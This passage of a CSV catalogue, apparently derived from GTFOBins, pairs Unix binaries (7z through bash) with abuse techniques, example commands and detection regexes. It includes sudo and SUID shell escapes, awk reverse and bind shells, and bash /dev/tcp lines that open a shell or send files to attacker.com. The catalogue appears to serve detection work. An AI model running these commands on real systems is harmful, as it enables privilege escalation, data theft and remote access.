Name,Function,ExampleCode,Regex,Notes
7z,file-read,7z a -ttar -an -so $LFILE | 7z e -ttar -si -so,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?7z\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
7z,sudo,sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?7z\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aa-exec,shell,aa-exec /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aa\-exec\s+(?:/bin/(?:sh|bash))),
aa-exec,suid,./aa-exec /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aa\-exec\s*\-p\s+(?:/bin/(?:sh|bash))),
aa-exec,sudo,sudo aa-exec /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aa\-exec\s+(?:/bin/(?:sh|bash))),
ab,file-upload,ab -p $LFILE $URL,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ab\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Upload local file via HTTP POST request.
ab,file-download,ab -v2 $URL,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ab\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length.
ab,suid,./ab -p $LFILE $URL,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ab\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Upload local file via HTTP POST request.
ab,sudo,sudo ab -p $LFILE $URL,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ab\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Upload local file via HTTP POST request.
agetty,suid,./agetty -o -p -l /bin/sh -a root tty,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?agetty\s*\-o\s*\-p\s*\-l\s*\-a\s+(?:/bin/(?:sh|bash))),
alpine,file-read,"alpine -F ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?alpine\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
alpine,suid,"./alpine -F ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?alpine\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
alpine,sudo,"sudo alpine -F ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?alpine\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ansible-playbook,shell,"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ansible\-playbook\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ansible-playbook,sudo,"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ansible\-playbook\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ansible-test,shell,ansible-test shell,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ansible\-test\s+.+),
ansible-test,sudo,sudo ansible-test shell,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ansible\-test\s+.+),
aoss,shell,aoss /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aoss\s+(?:/bin/(?:sh|bash))),
aoss,sudo,sudo aoss /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aoss\s+(?:/bin/(?:sh|bash))),
apache2ctl,file-read,"apache2ctl -c ""Include $LFILE"" -k stop","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apache2ctl\s*\-c\s*\-k\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
apache2ctl,sudo,"sudo apache2ctl -c ""Include $LFILE"" -k stop","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apache2ctl\s*\-c\s*\-k\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
apt-get,shell,"apt-get changelog apt
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\-get\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
apt-get,sudo,"sudo apt-get changelog apt
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\-get\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
apt-get,sudo,"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF
sudo apt-get install -c $TF sl","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\-get\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","For this to work the target package (e.g., `sl`) must not be installed."
apt-get,sudo,sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\-get\s*\-o\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",When the shell exits the `update` command is actually executed.
apt,shell,"apt changelog apt
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
apt,sudo,"sudo apt changelog apt
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
apt,sudo,"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF
sudo apt install -c $TF sl","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","For this to work the target package (e.g., `sl`) must not be installed."
apt,sudo,sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\s*\-o\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",When the shell exits the `update` command is actually executed.
ar,file-read,"ar r ""$TF"" ""$LFILE""
cat ""$TF""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ar\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ar,suid,"./ar r ""$TF"" ""$LFILE""
cat ""$TF""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ar\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ar,sudo,"sudo ar r ""$TF"" ""$LFILE""
cat ""$TF""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ar\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aria2c,command,"echo ""$COMMAND"" > $TF
chmod +x $TF
aria2c --on-download-error=$TF http://x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s*\-\-on\-download\-error\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aria2c,command,aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s*\-\-allow\-overwrite\s*\-\-gid\s*\-\-on\-download\-complete\s+.+),The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.
aria2c,file-download,"aria2c -o ""$LFILE"" ""$URL""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request. Use `--allow-overwrite` if needed.
aria2c,sudo,"echo ""$COMMAND"" > $TF
chmod +x $TF
sudo aria2c --on-download-error=$TF http://x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s*\-\-on\-download\-error\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aria2c,limited-suid,"echo ""$COMMAND"" > $TF
chmod +x $TF
./aria2c --on-download-error=$TF http://x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s*\-\-on\-download\-error\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
arj,file-read,"arj a ""$TF"" ""$LFILE""
arj p ""$TF""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?arj\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file appears amid some other textual information. The archive can also be downloaded then extracted offline.
arj,file-write,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
arj e ""$TF/a"" $LDIR","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?arj\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The archive can also be prepared offline then uploaded.
arj,sudo,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
sudo arj e ""$TF/a"" $LDIR","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?arj\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The archive can also be prepared offline then uploaded.
arj,suid,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
./arj e ""$TF/a"" $LDIR","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?arj\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The archive can also be prepared offline then uploaded.
arp,file-read,"arp -v -f ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?arp\s*\-v\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
arp,suid,"./arp -v -f ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?arp\s*\-v\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
arp,sudo,"sudo arp -v -f ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?arp\s*\-v\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
as,file-read,as @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?as\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
as,suid,./as @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?as\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
as,sudo,sudo as @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?as\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii-xfr,file-read,"ascii-xfr -ns ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ascii\-xfr\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii-xfr,suid,"./ascii-xfr -ns ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ascii\-xfr\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii-xfr,sudo,"sudo ascii-xfr -ns ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ascii\-xfr\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii85,file-read,"ascii85 ""$LFILE"" | ascii85 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ascii85\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii85,sudo,"sudo ascii85 ""$LFILE"" | ascii85 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ascii85\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ash,shell,ash,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ash\s+.+),
ash,file-write,"export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ash\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ash,suid,./ash,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ash\s+.+),
ash,sudo,sudo ash,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ash\s+.+),
aspell,file-read,"aspell -c ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aspell\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aspell,suid,"./aspell -c ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aspell\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aspell,sudo,"sudo aspell -c ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aspell\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
at,shell,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?at\s*\-f\s+(?:/bin/(?:sh|bash))),
at,command,"echo ""$COMMAND"" | at now","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?at\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The invocation will be blind, but it is possible to redirect the output to a file in a readable location."
at,sudo,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?at\s*\-f\s+(?:/bin/(?:sh|bash))),
atobm,file-read,"atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?atobm\s*\-F\s+(?:\bprintf\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
atobm,sudo,"sudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?atobm\s*\-F\s+(?:\bprintf\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
atobm,suid,"./atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?atobm\s*\-F\s+(?:\bprintf\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,shell,"awk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,non-interactive-reverse-shell,"awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s*\-v\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
awk,non-interactive-bind-shell,"awk -v LPORT=$LPORT 'BEGIN {
s = ""/inet/tcp/"" LPORT ""/0/0"";
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell.
awk,file-write,"awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s*\-v\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,file-read,"awk '//' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,suid,"./awk '//' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,sudo,"sudo awk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,limited-suid,"./awk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aws,shell,"aws help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aws\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
aws,sudo,"sudo aws help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aws\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
base32,file-read,"base32 ""$LFILE"" | base32 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base32\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base32,suid,"base32 ""$LFILE"" | base32 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base32\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base32,sudo,"sudo base32 ""$LFILE"" | base32 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base32\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base58,file-read,"base58 ""$LFILE"" | base58 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base58\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base58,sudo,"sudo base58 ""$LFILE"" | base58 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base58\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base64,file-read,"base64 ""$LFILE"" | base64 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base64\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base64,suid,"./base64 ""$LFILE"" | base64 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base64\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base64,sudo,"sudo base64 ""$LFILE"" | base64 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base64\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basenc,file-read,basenc --base64 $LFILE | basenc -d --base64,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?basenc\s*\-\-base64\s*\-d\s*\-\-base64\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basenc,suid,basenc --base64 $LFILE | basenc -d --base64,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?basenc\s*\-\-base64\s*\-d\s*\-\-base64\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basenc,sudo,sudo basenc --base64 $LFILE | basenc -d --base64,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?basenc\s*\-\-base64\s*\-d\s*\-\-base64\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basez,file-read,"basez ""$LFILE"" | basez --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?basez\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basez,suid,"./basez ""$LFILE"" | basez --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?basez\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basez,sudo,"sudo basez ""$LFILE"" | basez --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?basez\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bash,shell,bash,(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),
bash,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),Run `nc -l -p 12345` on the attacker box to receive the shell.
bash,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'echo -e ""POST / HTTP/0.9\n\n$(<$LFILE)"" > /dev/tcp/$RHOST/$RPORT'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
bash,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),"Send local file using a TCP connection. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file."
bash,file-download,"export RHOST=attacker.com
export RPORT=12345
